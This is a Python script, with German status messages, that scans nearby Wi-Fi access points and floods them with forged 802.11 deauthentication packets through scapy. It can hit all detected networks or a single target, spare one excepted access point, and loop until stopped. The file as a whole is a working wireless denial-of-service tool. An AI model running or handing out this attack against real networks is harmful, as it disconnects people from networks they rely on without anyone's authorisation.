from gi.repository import NetworkManager, NMClient
from scapy.all import *
from time import sleep
import sys
import argparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(description='This script scans all nearby APs and DeAuth all clients')
parser.add_argument('-i','--interface', help='The Interface in monitor mode',required=True)
parser.add_argument('-t','--target',help='Use on a single target', required=False,default='')
parser.add_argument('-c','--count',help='How many deAuth packets should be sent', required=False,default=1000)
parser.add_argument('-l','--loop',help='Will loop script till shutdown', required=False, action="store_true")
parser.add_argument('-a','--apscan',help='Will only scan for APs', required=False, action="store_true")
parser.add_argument('-s','--sleep',help='How long to sleep between loops (in seconds)', required=False, default=0)
parser.add_argument('-e','--exceptap',help='Except a specific AP; usage -e <mac>', required=False,default='')
parser.add_argument('-r','--reasoncode',help='DeAuth Reaso Code', required=False,   default=3)
args = parser.parse_args()

iface = args.interface
count = args.count
sleeptime = args.sleep
mac_except = args.exceptap
target = args.target

reason_code = 3

nmc = NMClient.Client.new()
devs = nmc.get_devices()

ap_macs = []


def main():

    print "\033[1m[*] Suche nach APs\033[0m"
    for dev in devs:
        if dev.get_device_type() == NetworkManager.DeviceType.WIFI:
            for ap in dev.get_access_points():
                ap_macs.append(ap.get_bssid())
                color = bcolors.OKBLUE
                if ap.get_bssid() == mac_except:
                    color = bcolors.OKGREEN
                if ap.get_bssid() == target:
                    color = bcolors.UNDERLINE

                print color+ap.get_ssid() + " (" + ap.get_bssid()+")\033[0m"

    print bcolors.BOLD+"[*] Result: "+str(len(ap_macs))+" AccessPoints "+bcolors.ENDC
    if args.apscan:
        exit(0)

    try:
        conf.iface = iface
        conf.verb = 0
    except:
        print "[!] Error wirh Interface"

    # Single Target
    if target!="":
        print "[*] Single target deauth ("+target+")"
        if (ap == mac_except):
            print "Target is also exception"
            exit(1)

        packet = RadioTap()/Dot11(type=0,subtype=12,addr1="FF:FF:FF:FF:FF:FF",addr2=target,addr3=target)/Dot11Deauth(reason=reason_code)
        print "\n[!] Beginning to Deauth '"+target+"'"
        for n in range(int(count)):
            sendPacket(packet)
            #time.sleep(0.1)

        print "[-] Finished"
        exit(1)


    # All APs
    for ap in ap_macs:
        if (ap == mac_except):
            break
        packet = RadioTap()/Dot11(type=0,subtype=12,addr1="FF:FF:FF:FF:FF:FF",addr2=ap,addr3=ap)/Dot11Deauth(reason=reason_code)

        print "\n[!] Beginning to Deauth '"+ap+"'"
        for n in range(int(count)):
            sendPacket(packet)

        print "[-] Finished"

def sendPacket(packet):
    try:
        sendp(packet)
    except Exception as e:
        print bcolors.FAIL+ "[!] Fehler beim Senden: "+ str(e) + bcolors.ENDC
        raise Exception("Fehler beim senden")

#Start Programm
prog_count = 0
erro_count = 0
while True:
    # Shutdown after 10 fails
    if erro_count > 10:
        exit(2)

    prog_count = prog_count + 1
    try:
        main()
    except Exception as e:
        erro_count = erro_count + 1
        print bcolors.WARNING+"[!]["+str(prog_count)+"] Fehler beim Ausfuehren (wiederhole in 30s)"+bcolors.ENDC
        print "Fehler: "+str(e)
        sleep(30)
        continue
    if args.loop != True:
        exit(0)

    print "Waiting "+sleeptime+" seconds to go on ..."
    sleep(float(sleeptime))
